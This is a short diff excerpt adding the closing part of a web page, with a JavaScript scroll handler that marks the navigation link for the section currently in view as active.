+        // Active navigation highlighting
+        const navLinks = document.querySelectorAll('.nav-link');
+        
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (scrollY >= sectionTop - 120) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href').substring(1) === current) {
+                    link.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
